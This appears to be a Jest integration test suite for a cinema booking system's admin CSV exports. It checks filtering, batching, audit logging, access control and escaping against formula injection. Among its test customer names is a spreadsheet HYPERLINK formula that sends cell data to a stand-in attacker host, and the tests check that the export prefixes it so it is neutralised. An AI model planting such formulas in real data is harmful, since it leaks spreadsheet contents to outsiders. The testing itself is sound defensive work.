import type { Response } from 'supertest';
import { BookingsRepository } from '../../../../src/modules/bookings/bookings.repository';
import { CustomersRepository } from '../../../../src/modules/customers/customers.repository';
import { PaymentsReportRepository } from '../../../../src/modules/analytics/payments-report.repository';
import { ExportOptions } from '../../../../src/modules/exports/export-options';
import { EmailSender } from '../../../../src/modules/messaging/senders/email-sender';
import { listAdminBookings, paidOnline, refundBooking } from '../../../support/admin-bookings';
import { counterSale } from '../../../support/box-office';
import { customerHold, pay } from '../../../support/checkout';
import { TestClock } from '../../../support/clock';
import { allPages, csvHeader, csvObjects, exportCsv } from '../../../support/csv';
import { bookableShowtime } from '../../../support/holds';
import { RecordingEmailSender } from '../../../support/messaging/recording-email-sender';
import { signInStaff, staffSession } from '../../../support/staff-auth';
import { createTestApp } from '../../../support/test-app';
import type { BookableShowtimeFixture, StaffSession, TestApp } from '../../../support/types';

jest.setTimeout(300_000);

/** Saturday 10 October 2026, 10:00 Cairo time: cinema day 2026-10-10; the shows are on the 11th. */
const NOW = new Date('2026-10-10T10:00:00+03:00');
/** The next cinema day, still before the shows. */
const NEXT_DAY = new Date('2026-10-11T09:00:00+03:00');

/** Every dangerous first character of design §13.4, in a customer's name. */
const FORMULA_NAMES = {
  equals: '=HYPERLINK("http://evil.example/?x="&A1,"Open")',
  plus: '+Plus Hassan',
  minus: '-Minus Hassan',
  at: '@At Hassan',
  tab: '\tTab Hassan',
  carriageReturn: '\rReturn Hassan',
} as const;

interface ListBooking {
  reference: string;
  status: string;
  paymentStatus: string;
  channel: string;
  owner: string;
  contact: { name: string | null; email: string | null; phone: string | null };
  showtime: {
    startsAt: string;
    cinemaDate: string;
    movie: { title: string };
    theater: { name: string };
    hall: { name: string };
  };
  seatLabels: string[];
  seatCount: number;
  total: { amount: number; currency: string };
  payment: {
    method: string;
    card: { brand: string; last4: string } | null;
    walletType: string | null;
    receiptReference: string | null;
  } | null;
  createdAt: string;
  confirmedAt: string | null;
  checkedInAt: string | null;
}

interface ListCustomer {
  id: number;
  fullName: string;
  email: string;
  phone: string | null;
  status: string;
  emailVerified: boolean;
  emailVerifiedAt: string | null;
  joinedAt: string;
  lastSignInAt: string | null;
  updatedAt: string;
  stats: {
    bookings: number;
    spent: { amount: number; currency: string };
    noShows: number;
    lastBookingAt: string | null;
  };
}

interface ListTransaction {
  id: number;
  occurredAt: string;
  cinemaDate: string;
  kind: string;
  purpose: string;
  method: string;
  channel: string;
  status: string;
  failureReason: string | null;
  ledgerStatus: string;
  amount: { amount: number; currency: string };
  refundOfPaymentId: number | null;
  refundedAmount: { amount: number } | null;
  pendingRefundAmount: { amount: number } | null;
  booking: { reference: string; channel: string; contactName: string | null };
  theater: { id: number; name: string };
  card: { brand: string; last4: string } | null;
  walletType: string | null;
  receiptReference: string | null;
  collectedBy: { fullName: string } | null;
  paidOutAt: string | null;
  paidOutBy: { fullName: string } | null;
  createdAt: string;
  completedAt: string | null;
}

/**
 * The formula-safe text of a cell, written here independently of the code under test (design
 * §13.4): text starting with `=`, `+`, `-`, `@`, a tab or a CR gets a leading apostrophe.
 */
function text(value: string | null): string {
  if (value === null) return '';
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

const pounds = (piastres: number | null | undefined): string =>
  piastres === null || piastres === undefined ? '' : String(piastres / 100);
const yesNo = (value: boolean): string => (value ? 'yes' : 'no');

/** A list row of `GET /admin/bookings` as its CSV row must read. */
function expectedBookingRow(row: ListBooking): Record<string, string> {
  return {
    Reference: row.reference,
    Status: row.status,
    'Payment status': row.paymentStatus,
    Channel: row.channel,
    Owner: row.owner,
    'Contact name': text(row.contact.name),
    'Contact email': text(row.contact.email),
    'Contact phone': text(row.contact.phone),
    Movie: text(row.showtime.movie.title),
    Theater: text(row.showtime.theater.name),
    Hall: text(row.showtime.hall.name),
    'Starts at': row.showtime.startsAt,
    'Cinema date': row.showtime.cinemaDate,
    Seats: row.seatLabels.join(' '),
    'Seat count': String(row.seatCount),
    Total: pounds(row.total.amount),
    Currency: row.total.currency,
    'Payment method': row.payment?.method ?? '',
    'Card brand': row.payment?.card?.brand ?? '',
    'Card last 4': row.payment?.card?.last4 ?? '',
    Wallet: row.payment?.walletType ?? '',
    'Receipt reference': text(row.payment?.receiptReference ?? null),
    'Created at': row.createdAt,
    'Confirmed at': row.confirmedAt ?? '',
    'Checked in at': row.checkedInAt ?? '',
  };
}

function expectedCustomerRow(row: ListCustomer): Record<string, string> {
  return {
    ID: String(row.id),
    'Full name': text(row.fullName),
    Email: text(row.email),
    Phone: text(row.phone),
    Status: row.status,
    'Email verified': yesNo(row.emailVerified),
    'Email verified at': row.emailVerifiedAt ?? '',
    'Joined at': row.joinedAt,
    'Last sign-in at': row.lastSignInAt ?? '',
    'Updated at': row.updatedAt,
    Bookings: String(row.stats.bookings),
    Spent: pounds(row.stats.spent.amount),
    Currency: row.stats.spent.currency,
    'No-shows': String(row.stats.noShows),
    'Last booking at': row.stats.lastBookingAt ?? '',
  };
}

function expectedPaymentRow(row: ListTransaction): Record<string, string> {
  return {
    ID: String(row.id),
    'Occurred at': row.occurredAt,
    'Cinema date': row.cinemaDate,
    Kind: row.kind,
    Purpose: row.purpose,
    Method: row.method,
    Channel: row.channel,
    Status: row.status,
    'Failure reason': row.failureReason ?? '',
    'Ledger status': row.ledgerStatus,
    Amount: pounds(row.amount.amount),
    Currency: row.amount.currency,
    'Refund of payment': row.refundOfPaymentId === null ? '' : String(row.refundOfPaymentId),
    'Refunded amount': pounds(row.refundedAmount?.amount ?? null),
    'Pending refund amount': pounds(row.pendingRefundAmount?.amount ?? null),
    'Booking reference': row.booking.reference,
    'Booking channel': row.booking.channel,
    'Contact name': text(row.booking.contactName),
    'Theater ID': String(row.theater.id),
    Theater: text(row.theater.name),
    'Card brand': row.card?.brand ?? '',
    'Card last 4': row.card?.last4 ?? '',
    Wallet: row.walletType ?? '',
    'Receipt reference': text(row.receiptReference),
    'Collected by': text(row.collectedBy?.fullName ?? null),
    'Paid out at': row.paidOutAt ?? '',
    'Paid out by': text(row.paidOutBy?.fullName ?? null),
    'Created at': row.createdAt,
    'Completed at': row.completedAt ?? '',
  };
}

function expectError(response: Response, status: number, code: string): void {
  expect({ status: response.status, code: response.body?.error?.code }).toEqual({ status, code });
}

/**
 * The CSV exports (design §11, §13.4; PRD "CSV exports"): real app and Postgres, only Resend
 * replaced. The exports read in batches of 2 (`ExportOptions`, configuration, not a stand-in for
 * any behaviour), so every file below spans several batches and their seams are checked.
 */
describe('CSV exports (integration)', () => {
  let testApp: TestApp;
  let admin: StaffSession;
  let boxOffice: StaffSession;
  let showtimeA: BookableShowtimeFixture;
  let showtimeB: BookableShowtimeFixture;
  const clock = new TestClock(NOW);
  const sender = new RecordingEmailSender();
  const references: Record<string, string> = {};
  const customerIds: Record<string, number> = {};

  async function signInAgain(): Promise<void> {
    admin = await signInStaff(testApp, admin.email, admin.password);
    boxOffice = await signInStaff(testApp, boxOffice.email, boxOffice.password);
  }

  async function exportOk(
    dataset: string,
    query: Readonly<Record<string, string | number | undefined>> = {},
  ) {
    const response = await exportCsv(testApp, admin.authorization, dataset, query);
    expect(response.status).toBe(200);
    return response;
  }

  async function exportEvents(): Promise<{ metadata: Record<string, unknown> }[]> {
    return testApp
      .knex('audit_events')
      .select<{ metadata: Record<string, unknown> }[]>('metadata', 'actor_staff_user_id')
      .where({ action: 'export.downloaded' })
      .orderBy('id');
  }

  beforeAll(async () => {
    testApp = await createTestApp({
      clock,
      overrides: [
        { provide: EmailSender, useValue: sender },
        { provide: ExportOptions, useValue: { batchSize: 2 } },
      ],
    });
    admin = await staffSession(testApp, 'admin', { fullName: 'Mona Saeed' });
    boxOffice = await staffSession(testApp, 'box_office', { fullName: '=Hany Adel' });
    showtimeA = await bookableShowtime(testApp, admin);
    showtimeB = await bookableShowtime(testApp, admin);

    // Cinema day 2026-10-10: one paid booking per dangerous name, a wallet, a counter sale, a
    // decline, a live hold, and a refund.
    const seats = ['B1', 'B2', 'B3', 'B4', 'B5', 'B6'];
    for (const [index, [key, fullName]] of Object.entries(FORMULA_NAMES).entries()) {
      const showtime = index % 2 === 0 ? showtimeA : showtimeB;
      const paid = await paidOnline(testApp, showtime.showtimeId, [seats[index]!], {
        fullName,
        ...(key === 'plus' ? { phone: '01012345678' } : {}),
      });
      references[key] = paid.reference;
      customerIds[key] = paid.customerId;
    }
    const wallet = await paidOnline(testApp, showtimeB.showtimeId, ['C1', 'C2'], {
      fullName: 'Nadia Farouk',
      payment: { method: 'wallet', token: 'sim_wallet_apple_pay' },
    });
    references.wallet = wallet.reference;
    customerIds.wallet = wallet.customerId;
    const cash = await counterSale(testApp, boxOffice.authorization, showtimeA.showtimeId, ['A1']);
    references.cash = cash.body.booking.reference as string;
    const declined = await customerHold(testApp, showtimeA.showtimeId, ['C5']);
    const decline = await pay(testApp, declined.customer.authorization, declined.reference, {
      method: 'card',
      token: 'sim_card_declined',
    });
    expect(decline.body.payment.status).toBe('declined');
    references.declined = declined.reference;
    references.held = (await customerHold(testApp, showtimeB.showtimeId, ['D1'])).reference;
    expect((await refundBooking(testApp, admin.authorization, references.minus!)).status).toBe(201);

    // Cinema day 2026-10-11: one more card sale.
    clock.set(NEXT_DAY);
    await signInAgain();
    const late = await paidOnline(testApp, showtimeA.showtimeId, ['C3'], {
      fullName: 'Late Buyer',
    });
    references.late = late.reference;
    customerIds.late = late.customerId;
  });

  beforeEach(async () => {
    clock.set(NEXT_DAY);
    await signInAgain();
    await testApp.knex('audit_events').where({ action: 'export.downloaded' }).delete();
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  afterAll(async () => {
    await testApp.close();
  });

  describe('GET /admin/exports/bookings.csv', () => {
    it('is the admin bookings list, every page, row for row and in order', async () => {
      const list = await allPages<ListBooking>(
        testApp,
        admin.authorization,
        '/api/v1/admin/bookings',
      );
      expect(list.length).toBeGreaterThanOrEqual(11);
      const response = await exportOk('bookings');
      expect(response.headers['content-type']).toBe('text/csv; charset=utf-8');
      expect(response.headers['content-disposition']).toBe(
        'attachment; filename="maqady-bookings-2026-10-11.csv"',
      );
      expect(response.headers['cache-control']).toBe('private, no-store');
      expect(csvHeader(response.text)).toEqual(Object.keys(expectedBookingRow(list[0]!)));
      expect(csvObjects(response.text)).toEqual(list.map(expectedBookingRow));
    });

    it('reads in batches: one page query of the list per batch, never the whole list at once', async () => {
      const repository = testApp.app.get(BookingsRepository, { strict: false });
      const pages = jest.spyOn(repository, 'pageForAdmin');
      const count = jest.spyOn(repository, 'countForAdmin');
      const rows = csvObjects((await exportOk('bookings')).text);
      expect(pages).toHaveBeenCalledTimes(Math.ceil(rows.length / 2));
      for (const [, , request] of pages.mock.calls) expect(request.limit).toBe(2);
      expect(count).not.toHaveBeenCalled();
    });

    it.each([
      ['a status', { status: 'confirmed' }],
      ['refunded', { status: 'refunded' }],
      ['failed', { status: 'failed' }],
      ['abandoned (an expired hold)', { status: 'abandoned' }],
      ['a channel', { channel: 'counter' }],
      ['a method', { method: 'wallet' }],
      ['a search', { q: 'nadia' }],
      ['a date range', { dateFrom: '2026-10-11', dateTo: '2026-10-11' }],
      ['two filters', { channel: 'online', status: 'confirmed' }],
    ])('filters as the list does: %s', async (_name, query) => {
      const list = await allPages<ListBooking>(
        testApp,
        admin.authorization,
        '/api/v1/admin/bookings',
        query,
      );
      expect(list.length).toBeGreaterThan(0);
      expect(csvObjects((await exportOk('bookings', query)).text)).toEqual(
        list.map(expectedBookingRow),
      );
    });

    it('filters by theater and by customer as the list does', async () => {
      for (const query of [
        { theaterId: showtimeA.theaterId },
        { customerId: customerIds.wallet! },
        { movieId: 999_999 },
      ]) {
        const list = await allPages<ListBooking>(
          testApp,
          admin.authorization,
          '/api/v1/admin/bookings',
          query,
        );
        expect(csvObjects((await exportOk('bookings', query)).text)).toEqual(
          list.map(expectedBookingRow),
        );
      }
    });

    it('prefixes every dangerous first character, so no cell runs as a formula', async () => {
      const rows = csvObjects((await exportOk('bookings')).text);
      const nameOf = (key: string) =>
        rows.find((row) => row.Reference === references[key])!['Contact name'];
      expect(nameOf('equals')).toBe(`'${FORMULA_NAMES.equals}`);
      expect(nameOf('plus')).toBe(`'${FORMULA_NAMES.plus}`);
      expect(nameOf('minus')).toBe(`'${FORMULA_NAMES.minus}`);
      expect(nameOf('at')).toBe(`'${FORMULA_NAMES.at}`);
      expect(nameOf('tab')).toBe(`'${FORMULA_NAMES.tab}`);
      expect(nameOf('carriageReturn')).toBe(`'${FORMULA_NAMES.carriageReturn}`);
      expect(nameOf('wallet')).toBe('Nadia Farouk');
      // An E.164 phone starts with "+": it stays text.
      const plus = rows.find((row) => row.Reference === references.plus)!;
      expect(plus['Contact phone']).toBe("'+201012345678");
      // Money is a plain number; nothing else in the file starts with a trigger unescaped.
      expect(rows.find((row) => row.Reference === references.wallet)!.Total).toBe('380');
      for (const row of rows) {
        for (const cell of Object.values(row)) expect(cell).not.toMatch(/^[=+\-@\t\r]/);
      }
    });

    it('records one export.downloaded event with the filters, never the search text', async () => {
      await exportOk('bookings', {
        q: 'nadia',
        status: 'confirmed',
        theaterId: showtimeB.theaterId,
      });
      const events = await testApp
        .knex('audit_events')
        .select('actor_kind', 'actor_staff_user_id', 'entity_type', 'entity_id', 'metadata')
        .where({ action: 'export.downloaded' });
      expect(events).toEqual([
        {
          actor_kind: 'staff',
          actor_staff_user_id: admin.staffUserId,
          entity_type: 'export',
          entity_id: null,
          metadata: {
            dataset: 'bookings',
            search: true,
            status: 'confirmed',
            theaterId: showtimeB.theaterId,
          },
        },
      ]);
      expect(JSON.stringify(events)).not.toContain('nadia');
    });

    it('answers a refused filter as JSON and records nothing', async () => {
      for (const query of [
        { dateFrom: '2026-10-11', dateTo: '2026-10-10' },
        { status: 'paid' },
        { cursor: 'WyIyMDI2LTEwLTEwVDA3OjAwOjAwLjAwMFoiLDFd' },
        { limit: 10 },
      ]) {
        const response = await exportCsv(testApp, admin.authorization, 'bookings', query);
        expectError(response, 400, 'VALIDATION_FAILED');
        expect(response.headers['content-type']).toMatch(/^application\/json/);
      }
      expect(await exportEvents()).toEqual([]);
    });

    it('answers just the header when nothing matches', async () => {
      const response = await exportOk('bookings', { q: 'nobody-at-all' });
      expect(csvObjects(response.text)).toEqual([]);
      expect(csvHeader(response.text)[0]).toBe('Reference');
    });
  });

  describe('GET /admin/exports/customers.csv', () => {
    it('is the admin customers list, every page, row for row and in order', async () => {
      const list = await allPages<ListCustomer>(
        testApp,
        admin.authorization,
        '/api/v1/admin/customers',
      );
      expect(list.length).toBeGreaterThanOrEqual(9);
      const response = await exportOk('customers');
      expect(response.headers['content-disposition']).toBe(
        'attachment; filename="maqady-customers-2026-10-11.csv"',
      );
      expect(csvObjects(response.text)).toEqual(list.map(expectedCustomerRow));
    });

    it('reads in batches of the list query, and filters as the list does', async () => {
      const pages = jest.spyOn(
        testApp.app.get(CustomersRepository, { strict: false }),
        'pageForAdmin',
      );
      const all = csvObjects((await exportOk('customers')).text);
      expect(pages).toHaveBeenCalledTimes(Math.ceil(all.length / 2));
      for (const query of [{ q: 'hassan' }, { q: '01012345678' }, { status: 'active' }]) {
        const list = await allPages<ListCustomer>(
          testApp,
          admin.authorization,
          '/api/v1/admin/customers',
          query,
        );
        expect(list.length).toBeGreaterThan(0);
        expect(csvObjects((await exportOk('customers', query)).text)).toEqual(
          list.map(expectedCustomerRow),
        );
      }
    });

    it('escapes the names and phones and records the search as a flag only', async () => {
      const rows = csvObjects((await exportOk('customers', { q: 'hassan' })).text);
      const names = rows.map((row) => row['Full name']).sort();
      expect(names).toEqual(
        [
          FORMULA_NAMES.equals,
          FORMULA_NAMES.plus,
          FORMULA_NAMES.minus,
          FORMULA_NAMES.at,
          FORMULA_NAMES.tab,
          FORMULA_NAMES.carriageReturn,
        ]
          .filter((name) => name.includes('Hassan'))
          .map((name) => `'${name}`)
          .sort(),
      );
      expect(rows.find((row) => row.ID === String(customerIds.plus))!.Phone).toBe("'+201012345678");
      expect((await exportEvents()).map((event) => event.metadata)).toEqual([
        { dataset: 'customers', search: true },
      ]);
    });
  });

  describe('GET /admin/exports/payments.csv', () => {
    it('is the transactions list, every page, row for row and in order', async () => {
      const list = await allPages<ListTransaction>(
        testApp,
        admin.authorization,
        '/api/v1/admin/payments',
      );
      expect(list.some((row) => row.kind === 'refund')).toBe(true);
      const response = await exportOk('payments');
      expect(response.headers['content-disposition']).toBe(
        'attachment; filename="maqady-payments-2026-10-11.csv"',
      );
      const rows = csvObjects(response.text);
      expect(rows).toEqual(list.map(expectedPaymentRow));
      // A refund is a negative amount, written as a number (not escaped).
      const refund = rows.find((row) => row.Kind === 'refund')!;
      expect(refund.Amount).toMatch(/^-\d/);
      // The box office member's name starts with "=": escaped where it is written.
      expect(rows.find((row) => row.Method === 'cash')!['Collected by']).toBe("'=Hany Adel");
    });

    it('reads in batches of the list query, and filters as the list does', async () => {
      const pages = jest.spyOn(
        testApp.app.get(PaymentsReportRepository, { strict: false }),
        'page',
      );
      const all = csvObjects((await exportOk('payments')).text);
      expect(pages).toHaveBeenCalledTimes(Math.ceil(all.length / 2));
      for (const query of [
        { kind: 'refund' },
        { status: 'failed' },
        { method: 'card' },
        { channel: 'counter' },
        { theaterId: showtimeB.theaterId },
        { dateFrom: '2026-10-10', dateTo: '2026-10-10' },
        { dateFrom: '2026-10-11' },
      ]) {
        const list = await allPages<ListTransaction>(
          testApp,
          admin.authorization,
          '/api/v1/admin/payments',
          query,
        );
        expect(list.length).toBeGreaterThan(0);
        expect(csvObjects((await exportOk('payments', query)).text)).toEqual(
          list.map(expectedPaymentRow),
        );
      }
      expect((await exportEvents()).at(-1)!.metadata).toEqual({
        dataset: 'payments',
        dateFrom: '2026-10-11',
      });
    });

    it('refuses an inverted period', async () => {
      expectError(
        await exportCsv(testApp, admin.authorization, 'payments', {
          dateFrom: '2026-10-11',
          dateTo: '2026-10-10',
        }),
        400,
        'VALIDATION_FAILED',
      );
      expect(await exportEvents()).toEqual([]);
    });
  });

  describe('GET /admin/exports/overview.csv', () => {
    /** The rows of one section and metric, by subject id. */
    function figures(rows: Record<string, string>[], section: string, metric: string) {
      return rows
        .filter((row) => row.Section === section && row.Metric === metric)
        .map((row) => ({ id: row['Subject ID'], value: row.Value, previous: row.Previous }));
    }

    it.each([
      ['the default period', {}],
      ['today', { period: 'today' }],
      ['dates', { dateFrom: '2026-10-11', dateTo: '2026-10-11' }],
    ])('is the Overview of the same query, figure for figure: %s', async (_name, query) => {
      const overview = await testApp
        .http()
        .get('/api/v1/admin/overview')
        .query(query)
        .set('Authorization', admin.authorization);
      expect(overview.status).toBe(200);
      const body = overview.body as {
        period: { dateFrom: string; dateTo: string };
        kpis: Record<string, { value: unknown; previous: unknown; change: number | null }>;
        byTheater: { theater: { id: number }; revenue: { amount: number }; ticketsSold: number }[];
        topMovies: { movie: { id: number }; revenue: { amount: number } }[];
        heatmap: unknown[];
        revenueTrend: { totals: unknown[]; theaters: { points: unknown[] }[] };
        tonight: { items: { showtimeId: number; ticketsSold: number }[] };
      };
      const response = await exportOk('overview', query);
      expect(response.headers['content-disposition']).toBe(
        'attachment; filename="maqady-overview-2026-10-11.csv"',
      );
      const rows = csvObjects(response.text);
      const money = (value: unknown) =>
        value === null ? '' : String((value as { amount: number }).amount / 100);
      const plain = (value: unknown) => (value === null ? '' : JSON.stringify(value));

      expect(figures(rows, 'period', 'dateFrom')[0]!.value).toBe(body.period.dateFrom);
      expect(figures(rows, 'period', 'dateTo')[0]!.value).toBe(body.period.dateTo);
      for (const metric of ['revenue', 'averageTicket']) {
        const kpi = body.kpis[metric]!;
        expect(figures(rows, 'kpis', metric)).toEqual([
          { id: '', value: money(kpi.value), previous: money(kpi.previous) },
        ]);
      }
      for (const metric of ['ticketsSold', 'occupancy', 'counterShare']) {
        const kpi = body.kpis[metric]!;
        expect(figures(rows, 'kpis', metric)).toEqual([
          { id: '', value: plain(kpi.value), previous: plain(kpi.previous) },
        ]);
      }
      expect(
        figures(rows, 'by_theater', 'revenue').map(({ id, value }) => ({ id, value })),
      ).toEqual(
        body.byTheater.map((row) => ({ id: String(row.theater.id), value: money(row.revenue) })),
      );
      expect(figures(rows, 'by_theater', 'ticketsSold').map((row) => row.value)).toEqual(
        body.byTheater.map((row) => String(row.ticketsSold)),
      );
      expect(figures(rows, 'top_movies', 'revenue').map((row) => row.value)).toEqual(
        body.topMovies.map((row) => money(row.revenue)),
      );
      expect(figures(rows, 'heatmap', 'ticketsSold')).toHaveLength(body.heatmap.length);
      expect(figures(rows, 'revenue_trend', 'revenue')).toHaveLength(
        body.revenueTrend.totals.length +
          body.revenueTrend.theaters.reduce((sum, series) => sum + series.points.length, 0),
      );
      expect(figures(rows, 'tonight', 'ticketsSold')).toEqual(
        body.tonight.items.map((show) => ({
          id: String(show.showtimeId),
          value: String(show.ticketsSold),
          previous: '',
        })),
      );
      expect(rows.some((row) => row.Section === 'by_hall')).toBe(false);
    });

    it('adds the halls for one theater, and records the query', async () => {
      const rows = csvObjects(
        (await exportOk('overview', { period: '7d', theaterId: showtimeA.theaterId })).text,
      );
      expect(rows.filter((row) => row.Section === 'by_hall').length).toBeGreaterThan(0);
      expect(rows.find((row) => row.Section === 'kpis')!['Subject ID']).toBe(
        String(showtimeA.theaterId),
      );
      expect((await exportEvents()).map((event) => event.metadata)).toEqual([
        { dataset: 'overview', period: '7d', theaterId: showtimeA.theaterId },
      ]);
    });

    it('answers NOT_FOUND for an unknown theater and VALIDATION_FAILED for a preset with dates', async () => {
      expectError(
        await exportCsv(testApp, admin.authorization, 'overview', { theaterId: 999_999 }),
        404,
        'NOT_FOUND',
      );
      expectError(
        await exportCsv(testApp, admin.authorization, 'overview', {
          period: '7d',
          dateFrom: '2026-10-10',
        }),
        400,
        'VALIDATION_FAILED',
      );
      expect(await exportEvents()).toEqual([]);
    });
  });

  describe('access', () => {
    const datasets = ['overview', 'bookings', 'customers', 'payments'];

    it('refuses a box office token on every export (FORBIDDEN) and records nothing', async () => {
      for (const dataset of datasets) {
        expectError(await exportCsv(testApp, boxOffice.authorization, dataset), 403, 'FORBIDDEN');
      }
      expect(await exportEvents()).toEqual([]);
    });

    it('refuses a customer token and no token (UNAUTHENTICATED)', async () => {
      const customer = await paidOnline(testApp, showtimeB.showtimeId, ['D4']);
      for (const dataset of datasets) {
        expectError(
          await exportCsv(testApp, customer.authorization, dataset),
          401,
          'UNAUTHENTICATED',
        );
        expectError(
          await testApp.http().get(`/api/v1/admin/exports/${dataset}.csv`),
          401,
          'UNAUTHENTICATED',
        );
      }
      // The list it would have exported is unchanged by the refusals.
      expect((await listAdminBookings(testApp, admin.authorization)).status).toBe(200);
    });
  });
});
